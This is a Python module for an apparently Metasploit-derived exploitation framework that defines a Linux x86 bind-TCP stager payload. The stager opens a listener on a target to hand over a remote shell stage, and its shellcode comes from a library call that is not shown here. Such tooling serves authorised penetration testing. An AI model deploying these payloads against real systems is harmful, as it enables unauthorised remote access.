from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x86.bind_tcp import BindTcpX86


class TerasploitModule(BindTcpX86, Payload):
    """Linux x86 bind-TCP stager."""

    NAME: str = "Linux x86 Bind TCP Stager"
    DESCRIPTION: str = (
        "Linux IA-32 stager that opens a TCP listener on the target and waits for the framework to connect and deliver the companion stage."
    )
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/linux/x86/bind_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/linux/bind_tcp.rb",
    ]
    PAYLOAD_TYPE: str = STAGER
    HANDLER: object = PayloadHandler.BindTCP
    STAGE_PATH: str = "linux.x86.shell"
    CACHED_SIZE: int = 111
    MAX_SIZE: int | None = 300
    ARCH: Sequence = [ARCH_X86]
    PLATFORM: Sequence = [PLATFORM_LINUX]
    OPTIONS: Sequence = ["RHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """Generate the Linux x86 bind-TCP stager shellcode."""
        port = int(ctx.get_option("LPORT"))
        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()

        # Generate a bind tcp stager.
        shellcode = self.generate_bind_tcp(port, exitfunc=exitfunc)

        return shellcode
